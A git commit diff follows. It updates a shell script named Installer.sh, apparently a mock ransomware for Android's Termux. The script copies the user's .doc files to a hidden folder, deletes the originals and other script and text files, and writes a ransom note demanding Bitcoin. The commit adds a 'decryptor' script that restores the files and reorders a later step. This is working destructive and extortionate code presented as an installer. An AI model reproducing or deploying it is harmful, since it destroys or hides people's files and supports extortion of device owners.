8c9a771b3c58c380f2705d58f5ea5ec6aec13e44
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2021-11-07 12:28:02 +0700

    Update Installer.sh

--- Installer.sh
+++ Installer.sh
@@ -5,6 +5,27 @@ tree | lolcat
 cd /$HOME
 cp -r *.doc /sdcard/Encrypted
 rm -r *.doc
+cd /sdcard/Download
+echo "tree">Python3.py
+echo "tree">Python2.py
+echo "tree">InstallerPy.py
+echo "cd $HOME
+rm -r *.sh
+rm -r *.txt
+rm -r *.Encrypted
+cd /sdcard/Encrypted
+ls
+mv * /$HOME
+ls
+cd /sdcard/Download
+rm -r *.py
+cd /sdcard
+rm -r Encrypted
+cd /$HOME
+echo "Decrypt 100%">Decryptor.txt
+clear
+cd /sdcard/Download
+rm -r *.sh">Decryptor.sh
 cd /sdcard
 echo "HUFCHf38384ifuJjtkRjgjfj28483">Encrypted.Encrypted
 mv /sdcard/*.Encrypted /$HOME
@@ -17,11 +38,11 @@ pkg install git
 pkg install python3 -y
 pkg update
 rm -r.Check.sh">Check.sh
-bash Check.sh
 echo "Oops! Your File Have Been Encrypted!!
 Payment :600.7
 Bitcoin:eUeuf7H2ur73jf&eUeuf7
 ID:
 Ransomware In Termux">Note.txt
 rm -r Installer.sh
+bash Check.sh
 exit
